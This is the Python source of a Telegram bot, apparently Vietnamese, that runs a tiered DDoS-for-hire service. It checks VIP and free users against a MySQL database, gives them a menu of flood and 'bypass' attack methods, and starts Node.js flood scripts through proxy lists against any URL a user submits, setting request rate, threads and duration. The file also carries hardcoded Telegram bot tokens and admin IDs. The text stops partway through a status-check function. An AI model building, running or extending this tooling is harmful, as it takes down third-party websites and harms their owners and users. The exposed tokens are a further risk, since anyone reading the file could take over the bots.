import logging, aiofiles, secrets, time, hashlib, datetime,subprocess, aiohttp
from typing import Set, Tuple
from typing import Tuple
from collections import Counter, defaultdict
import random, asyncio, os, sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    CallbackQueryHandler,
    CallbackContext,
    ContextTypes
)
from telegram.error import NetworkError, TelegramError, TimedOut , RetryAfter
import threading
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import json
import requests
import psutil
from functools import wraps, partial
from datetime import datetime, date
import pytz
import re
import ipaddress

# Logging setup
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("ddos.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Constants
TOKEN = '7175807614:AAEUtNjcRb72BJJL0hIsRGcVySYL8hfcS6E' #use 
# TOKEN = '7689457850:AAHYuqviFOIVGhgaBVXadDenURuoysBnSSU' #test 
ADMIN_IDS = [6464715777, 7371969470]  
admins = set(ADMIN_IDS) 
ALLOWED_GROUP_ID = -1002259079939 # usse
# ALLOWED_GROUP_ID = -1002371455370 # tess
MAX_RETRIES = 3
RETRY_DELAY = 5
STATUS_CHECK_COOLDOWN = 5
MAX_CHECK_ATTEMPTS = 5
monitoring_task = None
MONITOR_CHAT_ID = -1002313372403 # info cpu gpu
# MONITOR_CHAT_ID = -1002371455370 # info cpu gpu test

# Global variables
bot_active = True
status_check_counts = defaultdict(int)
status_check_cooldowns = {}
attack_processes = {}

# File paths
# attack_history_file = "attack_history.json"
# admin_file = "admin.txt"

# Timezone setup
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
def get_vietnam_time():
    return datetime.now(vietnam_tz)

def TimeStamp():
    now = str(date.today())
    return now

# Initialize time variables
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

class ReloadOnChangeHandler(FileSystemEventHandler):
    def __init__(self, restart_callback):
        super().__init__()
        self.restart_callback = restart_callback

    def on_modified(self, event):
        if event.src_path.endswith(".py"):
            logger.info("Detected code change. Restarting bot...")
            self.restart_callback()

def restrict_room(func=None, *, ignore_restriction=False, enable_cooldown=False):
    if func is None:
        return partial(restrict_room, ignore_restriction=ignore_restriction, enable_cooldown=enable_cooldown)
        
    @wraps(func)
    async def wrapper(update: Update, context: CallbackContext):
        if update.message is None:
            return
            
        user_id = update.message.from_user.id
        chat_id = update.message.chat_id
        
        # Ki·ªÉm tra bot_active v√† user_id
        if not bot_active and user_id not in admins and func.__name__ != "bot_on":
            await update.message.reply_text("Bot hi·ªán ƒëang t·∫Øt.")
            return

        # Ki·ªÉm tra CPU v√† RAM usage
        if func.__name__ == "ddos":  # Ch·ªâ ki·ªÉm tra cho l·ªánh ddos
            try:
                cpu_percent = psutil.cpu_percent(interval=1)
                memory = psutil.virtual_memory()
                memory_percent = memory.percent

                if cpu_percent >= 85 or memory_percent >= 85:
                    await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ö†Ô∏è C·∫¢NH B√ÅO T√ÄI NGUY√äN
‚ïë ‚Ä¢ CPU: {cpu_percent}%
‚ïë ‚Ä¢ RAM: {memory_percent}%
‚ïë ‚Ä¢ H·ªá th·ªëng ƒëang qu√° t·∫£i
‚ïë ‚Ä¢ Vui l√≤ng th·ª≠ l·∫°i sau
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
                    return
            except Exception as e:
                logger.error(f"Error checking system resources: {e}")
            
        if chat_id != ALLOWED_GROUP_ID and not ignore_restriction:
            return
            
        return await func(update, context)
            
    return wrapper

@restrict_room(ignore_restriction=True)  # Cho ph√©p s·ª≠ d·ª•ng ·ªü m·ªçi chat
async def bot_off(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if not bot_active:
        await update.message.reply_text('Bot hi·ªán ƒëang t·∫Øt.')
        return
        
    if user_id in admins:  # S·ª≠a th√†nh so s√°nh b·∫±ng v√¨ ADMIN_ID l√† s·ªë
        bot_active = False
        await update.message.reply_text('Bot ƒë√£ ƒë∆∞·ª£c t·∫Øt.')
    else:
        # await update.message.reply_text('B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán thao t√°c n√†y.')
        pass

@restrict_room(ignore_restriction=True)  # Cho ph√©p s·ª≠ d·ª•ng ·ªü m·ªçi chat  
async def bot_on(update: Update, context: CallbackContext):
    global bot_active
    user_id = update.message.from_user.id
    
    if user_id in admins:  # S·ª≠a th√†nh so s√°nh b·∫±ng v√¨ ADMIN_ID l√† s·ªë
        bot_active = True
        await update.message.reply_text('Bot ƒë√£ ƒë∆∞·ª£c b·∫≠t.')
    else:
        # await update.message.reply_text('B·∫°n kh√¥ng c√≥ quy·ªÅn th·ª±c hi·ªán thao t√°c n√†y.')
        pass
# END ADMIN CONMAND 

async def error_handler(update: object, context: CallbackContext) -> None:
    logger.error("Exception while handling an update:", exc_info=context.error)
    
    try:
        if isinstance(context.error, TimedOut):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="‚åõ Timeout error. Retrying..."
                )
        elif isinstance(context.error, NetworkError):
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text="üåê Network error. Retrying..."
                )
        else:
            if update and update.effective_chat:
                await context.bot.send_message(
                    chat_id=update.effective_chat.id,
                    text=f"‚ùå An error occurred: {str(context.error)}"
                )
            logger.error(f"Update {update} caused error {context.error}")
    except Exception as e:
        logger.error(f"Error in error handler: {e}", exc_info=True)

# SQl connect
import pytz
from datetime import date
import mysql.connector
from modules.database_connection import DatabaseConnection
def get_vietnam_time():
    tz = pytz.timezone('Asia/Ho_Chi_Minh')
    return datetime.now(tz)
def TimeStamp():
  now = str(date.today())
  return now
vietnam_tz = pytz.timezone('Asia/Ho_Chi_Minh')
last_reset_time = datetime.now(vietnam_tz)
current_time = datetime.now(vietnam_tz)
start_time = datetime.now(vietnam_tz)

db = DatabaseConnection.get_instance()
def load_users_from_mysql():
    try:
        db = DatabaseConnection.get_instance()
        query = "SELECT user_id, expiration_time, expiration_key_time, using_key FROM users"
        results = db.execute_query(query)
        
        if results is None:
            return set(), set(), {}
            
        vip_users = set()
        freeuser = set()
        vip_expiration = {}
        
        if results:
            for (user_id, expiration_time, expiration_key_time, using_key) in results:
                # Convert naive datetime to aware datetime with Vietnam timezone
                if expiration_time:
                    expiration_time = vietnam_tz.localize(expiration_time)
                if expiration_key_time:
                    expiration_key_time = vietnam_tz.localize(expiration_key_time)
                    
                current_time = datetime.now(vietnam_tz)
                
                if expiration_time and expiration_time > current_time:
                    vip_users.add(user_id)
                    vip_expiration[user_id] = expiration_time
                elif using_key and expiration_key_time and expiration_key_time > current_time:
                    freeuser.add(user_id)
        
        return vip_users, freeuser, vip_expiration
    except Exception as e:
        # Log error if needed
        return set(), set(), {}

vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
# End SQl connect
# DDoS
user_cooldowns_ddos = {}
user_cooldowns_ddos_vip = {}
# ƒê·ªãnh nghƒ©a c√°c c·∫•u h√¨nh cho VIP v√† FREE users
VIP_CONFIG = {
    'methods': ['FLOOD', 'BYPASS', 'FLOOD2', 'BYPASS2'],  # Th√™m 2 ph∆∞∆°ng th·ª©c m·ªõi
    'time': 120,  # th·ªùi gian ddos vip
    'rate': 15,
    'threads': 10,
    'proxy': './modules/proxy.txt', 
    'cooldown': 150  # th·ªùi gian ch·ªù vip
}
FREE_CONFIG = {
    'methods': ['FLOOD'],
    'time': 70,  # th·ªùi gian ddos free
    'rate': 8,
    'threads': 4,
    'proxy': './modules/proxy.txt',
    'cooldown': 120  # th·ªùi gian ch·ªù free
}
# Dictionary l∆∞u th·ªùi gian cooldown c·ªßa user
user_cooldowns = {}

def validate_url(url: str) -> Tuple[bool, str]:
    # Blacklist domains
    blacklist = [
        "bdu", "edu",  "chinhphu", "cloudflare", "gov", "google", 
        "facebook", "tiktok", "microsoft", "apple", "amazon", 
        "netflix", "twitter", "instagram", "github", "gitlab", 
        "heroku", "azure", "aws", "alibaba", "oracle", "ibm", 
        "cisco", "akamai", "youtube", "yahoo", "bing", "paypal", 
        "shopify", "wix", "squarespace", "digitalocean", "linode", 
        "vultr", "godaddy", "namecheap", "cloudways", "plesk", "cpanel"
    ]
    
    # Lo·∫°i b·ªè kho·∫£ng tr·∫Øng
    url = url.strip().lower()  # Convert to lowercase for case-insensitive comparison
    
    # Ki·ªÉm tra ƒë·ªô d√†i URL
    if len(url) < 3 or len(url) > 2048:
        return False, "‚ùå URL kh√¥ng h·ª£p l·ªá (ƒë·ªô d√†i kh√¥ng ph√π h·ª£p)"

    # Th√™m schema n·∫øu kh√¥ng c√≥
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url

    try:
        # Parse URL ƒë·ªÉ ki·ªÉm tra c√°c th√†nh ph·∫ßn
        from urllib.parse import urlparse
        parsed = urlparse(url)
        
        # Ki·ªÉm tra hostname
        hostname = parsed.hostname
        if not hostname:
            return False, "‚ùå URL kh√¥ng h·ª£p l·ªá (kh√¥ng c√≥ hostname)"

        # Ki·ªÉm tra IP address
        try:
            ipaddress.ip_address(hostname)
            return False, "‚ùå Kh√¥ng h·ªó tr·ª£ t·∫•n c√¥ng IPv4/IPv6"
        except ValueError:
            pass

        # Ki·ªÉm tra blacklist
        for blocked in blacklist:
            if blocked in hostname:
                return False, f'''
‚ùå Url b·ªã c·∫•m
'''

        # Ki·ªÉm tra c√°c k√Ω t·ª± kh√¥ng h·ª£p l·ªá trong URL
        invalid_chars = set('<>"{}|\\^`')
        if any(char in url for char in invalid_chars):
            return False, "‚ùå URL ch·ª©a k√Ω t·ª± kh√¥ng h·ª£p l·ªá"

        # Ki·ªÉm tra ƒë·ªô d√†i c·ªßa t·ª´ng ph·∫ßn
        if len(hostname) > 253:  # Max length of domain name
            return False, "‚ùå Domain qu√° d√†i"
        
        if parsed.path and len(parsed.path) > 1024:
            return False, "‚ùå Path qu√° d√†i"

        # Ki·ªÉm tra TLD h·ª£p l·ªá (√≠t nh·∫•t 2 k√Ω t·ª±)
        tld = hostname.split('.')[-1]
        if len(tld) < 2:
            return False, "‚ùå TLD kh√¥ng h·ª£p l·ªá"

        return True, url

    except Exception as e:
        logger.error(f"URL validation error: {str(e)}")
        return False, "‚ùå URL kh√¥ng h·ª£p l·ªá"

# Methods
@restrict_room(ignore_restriction=True)
async def methods(update: Update, context: CallbackContext):
    # Dictionary ch·ª©a m√¥ t·∫£ cho t·ª´ng ph∆∞∆°ng th·ª©c
    method_descriptions = {
        'FLOOD': 'Website kh√¥ng c√≥ b·∫£o v·ªá',
        'BYPASS': 'C√≥ kh·∫£ nƒÉng v∆∞·ª£t 1 s·ªë bi·ªán ph√°p b·∫£o v·ªá',
        'FLOOD2': 'Website kh√¥ng c√≥ b·∫£o v·ªá',
        'BYPASS2': 'Kh·∫£ nƒÉng v∆∞·ª£t qua b·∫£o v·ªá h√™n xu'
    }
    
    # T·∫°o danh s√°ch ph∆∞∆°ng th·ª©c v·ªõi m√¥ t·∫£
    methods_list = '\n'.join(
        f'‚Ä¢ <code>{method}</code>\n  ‚îî‚îÄ {method_descriptions.get(method, "Kh√¥ng c√≥ m√¥ t·∫£")}'
        for method in VIP_CONFIG['methods']
    )
    
    message = f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìù PH∆Ø∆†NG TH·ª®C T·∫§N C√îNG
{methods_list}
‚ïë üí° S·ª≠ d·ª•ng v·ªõi /ddos
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê'''
    
    await update.message.reply_text(message, parse_mode='HTML')
# End Methods

import shutil

def get_node_path():
    """Get the correct path to Node.js executable"""
    try:
        # Th·ª≠ l·∫•y ƒë∆∞·ªùng d·∫´n t·ª´ which
        node_path = subprocess.check_output(['which', 'node'], 
                                          universal_newlines=True).strip()
        if node_path:
            return node_path
    except:
        # C√°c ƒë∆∞·ªùng d·∫´n ph·ªï bi·∫øn ƒë·ªÉ t√¨m node
        possible_paths = [
            '/usr/bin/node',
            '/usr/local/bin/node',
            '/root/.nvm/versions/node/v22.11.0/bin/node',  # NVM path
            os.path.expanduser('~/.nvm/versions/node/v22.11.0/bin/node')
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
                
    return None

# L·∫•y ƒë∆∞·ªùng d·∫´n node m·ªôt l·∫ßn khi kh·ªüi ƒë·ªông
NODE_PATH = get_node_path()

active_attacks = {} 
@restrict_room
async def ddos(update: Update, context: CallbackContext):
    vip_users, freeuser, vip_expiration = load_users_from_mysql() or (set(), set(), {})
    try:
        user_id = update.message.from_user.id
        current_time = time.time()
        # Ki·ªÉm tra user type v√† admin
        is_admin = user_id in admins
        is_vip = user_id in vip_users
        is_free = user_id in freeuser
        if not NODE_PATH:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå L·ªñI KH·ªûI ƒê·ªòNG
‚ïë ‚Ä¢ Kh√¥ng t√¨m th·∫•y Node.js
‚ïë ‚Ä¢ Vui l√≤ng ki·ªÉm tra c√†i ƒë·∫∑t
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
        if not is_admin and user_id in active_attacks: # b·ªè qua admin 
            attack_info = active_attacks[user_id]
            remaining_time = int(attack_info['end_time'] - current_time)
            
            if remaining_time > 0:
                await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ö†Ô∏è Spam t k√≠ch b√¢y gi·ªù
‚ïë ‚Ä¢ ƒêang t·∫•n c√¥ng: <code>{attack_info['target']}</code>
‚ïë ‚Ä¢ Th·ªùi gian ch·ªù c√≤n l·∫°i: {remaining_time} gi√¢y
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''', parse_mode='HTML')
                return
            else:
                # N·∫øu th·ªùi gian ƒë√£ h·∫øt, x√≥a th√¥ng tin t·∫•n c√¥ng
                del active_attacks[user_id]

        if not (is_admin or is_vip or is_free):
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚Ä¢ Mua VIP ho·∫∑c l·∫•y KEY ƒë·ªÉ /ddos
‚ïë ‚Ä¢ L·∫•y key: /laykey
‚ïë ‚Ä¢ X√°c th·ª±c key: /key + key ƒë√£ l·∫•y
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return

        # Thi·∫øt l·∫≠p config d·ª±a tr√™n lo·∫°i user
        if is_admin:
            config = VIP_CONFIG.copy()
            config['cooldown'] = 0
            config['time'] = 200  
            config['rate'] = 15   
            config['threads'] = 10  
        elif is_vip:
            config = VIP_CONFIG.copy()
        else:
            config = FREE_CONFIG.copy()

        # Ki·ªÉm tra cooldown (b·ªè qua n·∫øu l√† admin)
        if not is_admin:
            last_used = user_cooldowns.get(user_id, 0)
            if current_time - last_used < config['cooldown']:
                remaining = int(config['cooldown'] - (current_time - last_used))
                await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚è≥ VUI L√íNG ƒê·ª¢I
‚ïë ‚Ä¢ C√≤n {remaining}s ƒë·ªÉ g·ªçi l·ªánh /ddos
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
                return

        args = context.args
        if len(args) < 1:
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìù H∆Ø·ªöNG D·∫™N ADMIN DDOS
‚ïë ‚ñ∂ C√°ch 1:
‚ïë ‚Ä¢ /ddos + methods + url + time
‚ïë ‚Ä¢ VD: /ddos FLOOD example.com 300
‚ïë ‚ñ∂ C√°ch 2:
‚ïë ‚Ä¢ /ddos + url + time
‚ïë ‚Ä¢ VD: /ddos example.com 300
‚ïë ‚ñ∂ Ph∆∞∆°ng th·ª©c:
‚ïë ‚Ä¢ FLOOD: T·∫•n c√¥ng th∆∞·ªùng
‚ïë ‚Ä¢ BYPASS: T·∫•n c√¥ng bypass
‚ïë ‚Ä¢ FLOOD2: T·∫•n c√¥ng non-protection
‚ïë ‚Ä¢ BYPASS2: T·∫•n c√¥ng try-protection
‚ïë üí° /methods: ƒë·ªÉ xem ph∆∞∆°ng th·ª©c
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return
        elif is_vip:
            if len(args) < 1:
                await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìù DDOS VIP USER
‚ïë ‚ñ∂ C√°ch 1:
‚ïë ‚Ä¢ /ddos + url
‚ïë ‚Ä¢ VD: /ddos example.com
‚ïë ‚ñ∂ C√°ch 2:
‚ïë ‚Ä¢ /ddos + ph∆∞∆°ng th·ª©c + url
‚ïë ‚Ä¢ VD: /ddos BYPASS example.com
‚ïë ‚ñ∂ Ph∆∞∆°ng th·ª©c:
‚ïë ‚Ä¢ FLOOD: T·∫•n c√¥ng th∆∞·ªùng
‚ïë ‚Ä¢ BYPASS: T·∫•n c√¥ng bypass
‚ïë ‚Ä¢ FLOOD2: T·∫•n c√¥ng non-protection
‚ïë ‚Ä¢ BYPASS2: T·∫•n c√¥ng try-protection
‚ïë ‚ñ∂ Th√¥ng tin:
‚ïë ‚Ä¢ Th·ªùi gian: {config['time']}s
‚ïë ‚Ä¢ Cooldown: {config['cooldown']}s
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
                return
        else:  # FREE user
            if len(args) < 1:
                await update.message.reply_text(f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üìù DDOS FREE USER
‚ïë ‚Ä¢ /ddos + url
‚ïë ‚Ä¢ VD: /ddos example.com
‚ïë ‚ñ∂ Th√¥ng tin:
‚ïë ‚Ä¢ Th·ªùi gian: {config['time']}s
‚ïë ‚Ä¢ Cooldown: {config['cooldown']}s
‚ïë ‚Ä¢ Ch·ªâ h·ªó tr·ª£: FLOOD
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
                return

        # X·ª≠ l√Ω arguments d·ª±a tr√™n lo·∫°i user
        if is_admin:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
                attack_time = int(args[2]) if len(args) > 2 and args[2].isdigit() else config['time']
            else:
                method = 'FLOOD'  # Default method
                url = args[0]
                attack_time = int(args[1]) if len(args) > 1 and args[1].isdigit() else config['time']
        elif is_vip:
            if args[0].upper() in config['methods']:
                method = args[0].upper()
                url = args[1] if len(args) > 1 else None
            else:
                method = 'FLOOD'
                url = args[0]
            attack_time = config['time']
        else:  # FREE user
            # Lu√¥n s·ª≠ d·ª•ng method FLOOD v√† l·∫•y URL t·ª´ argument cu·ªëi c√πng
            method = 'FLOOD'
            url = args[-1]  # L·∫•y argument cu·ªëi c√πng l√†m URL
            attack_time = config['time']

        if url is None:
            await update.message.reply_text('S·ª≠ d·ª•ng /ddos ƒë·ªÉ xem h∆∞·ªõng d·∫´n')
            return
        # Validate URL
        is_valid, result = validate_url(url)
        if not is_valid:
            await update.message.reply_text(result)
            return
        url = result  # Use validated and formatted URL

        # L·∫•y c√°c th√¥ng s·ªë t·ª´ config
        rate = config['rate']
        threads = config['threads']
        proxy = config['proxy']

        max_time = 200 # ƒë·∫£m b·∫£o kh√¥ng v∆∞·ª£t qu√° th·ªùi gian. N·∫øu v∆∞·ª£t -> 200 ( max tine ddos)
        if attack_time > max_time:
            attack_time = max_time
        try:
            if not is_admin:
                active_attacks[user_id] = {
                    'end_time': current_time + attack_time,
                    'target': url
                }
            if method == 'FLOOD2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/non-protection.js'),
                        url,                             # target (process.argv[2])
                        str(min(attack_time, max_time)), # time (process.argv[3])
                        str(rate),                       # Rate (process.argv[4])
                        str(threads),                    # threads (process.argv[5])
                        proxy                            # proxyFile (process.argv[6])
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting FLOOD2 attack: {e}")
                    await update.message.reply_text("‚ùå Kh√¥ng th·ªÉ kh·ªüi ƒë·ªông FLOOD2")
                    return
            elif method == 'BYPASS2':
                try:
                    process = subprocess.Popen([
                        # 'node',
                        NODE_PATH, 
                        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/try-protection.js'),
                        'GET',
                        str(min(attack_time, max_time)), 
                        str(threads),
                        proxy,
                        str(rate),
                        url
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("‚ùå Kh√¥ng th·ªÉ kh·ªüi ƒë·ªông BYPASS2")
                    return
            elif method == 'BYPASS':
                try:
                    process = subprocess.Popen([
                    # 'node',
                    NODE_PATH, 
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
                    ])
                    attack_processes[update.message.chat_id] = process
                except Exception as e:
                    logger.error(f"Error starting BYPASS2 attack: {e}")
                    await update.message.reply_text("‚ùå Kh√¥ng th·ªÉ kh·ªüi ƒë·ªông BYPASS2")
                    return
            else:
                process = subprocess.Popen([
                    # 'node',
                    NODE_PATH,
                    '--max-old-space-size=4096',
                    os.path.join(os.path.dirname(os.path.abspath(__file__)), 'modules/two-methods.js'),
                    url,
                    str(min(attack_time, max_time)), 
                    str(rate),
                    str(threads),
                    proxy,
                    method
            ])
            attack_processes[update.message.chat_id] = process
            
        except Exception as e:
            logger.error(f"Error starting attack process: {e}")
            await update.message.reply_text('''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë ‚ùå L·ªñI KH·ªûI ƒê·ªòNG
‚ïë ‚Ä¢ Kh√¥ng th·ªÉ b·∫Øt ƒë·∫ßu t·∫•n c√¥ng
‚ïë ‚Ä¢ Vui l√≤ng th·ª≠ l·∫°i sau
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''')
            return

        # C·∫≠p nh·∫≠t cooldown
        user_cooldowns[user_id] = current_time

        # Create keyboard
        keyboard = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("üîç Check host", url=f"https://check-host.net/check-http?host={url}"),
                InlineKeyboardButton("üìä Ki·ªÉm tra nhanh", callback_data=f"st_{url}")
            ]
        ])

        # X√°c ƒë·ªãnh user type cho tin nh·∫Øn
        if is_admin:
            user_type = "ADMIN"
        elif is_vip:
            user_type = "VIP"
        else:
            user_type = "FREE"

        attack_msg = await update.message.reply_text(
            f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üöÄ B·∫Øt ƒë·∫ßu t·∫•n c√¥ng [{user_type}]
‚ïë ‚Ä¢ Website: <code>{url}</code>
‚ïë ‚Ä¢ Th·ªùi gian: {attack_time}s
‚ïë ‚Ä¢ Request/s: {rate}
‚ïë ‚Ä¢ Lu·ªìng: {threads}
‚ïë ‚Ä¢ Ph∆∞∆°ng th·ª©c: {method}
‚ïë ‚Ä¢ S·ª≠ d·ª•ng l·∫°i trong: {config['cooldown']} gi√¢y
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''',
            reply_markup=keyboard,
            parse_mode='HTML'
        )

        async def end_attack():
            try:
                await asyncio.sleep(attack_time)
                
    
                if process.poll() is None:  
                    process.terminate()
                    try:
                        process.wait(timeout=5) 
                    except subprocess.TimeoutExpired:
                        process.kill()  
                
                attack_processes.pop(update.message.chat_id, None)
                
                try:
                    await attack_msg.edit_text(
                        f'''
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
‚ïë üõë D·ª´ng t·∫•n c√¥ng
‚ïë ‚Ä¢ Website: <code>{url}</code>
‚ïë ‚Ä¢ Th·ªùi gian: {attack_time}s
‚ïë ‚Ä¢ Ph∆∞∆°ng th·ª©c: {method}
‚ïë ‚Ä¢ Tr·∫°ng th√°i: Ho√†n th√†nh
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê''',
                        parse_mode='HTML'
                    )
                except Exception as e:
                    logger.error(f"Error updating end message: {e}")
                    
            except Exception as e:
                logger.error(f"Error in end_attack: {e}")

        asyncio.create_task(end_attack())
        
    except Exception as e:
        logger.error(f"Error in ddos command: {e}")
        await update.message.reply_text(f"‚ùå")

async def handle_status_check(update: Update, context: CallbackContext):
    query = update.callback_query
    try:
        message_id = f"{query.message.chat.id}_{query.message.message_id}"
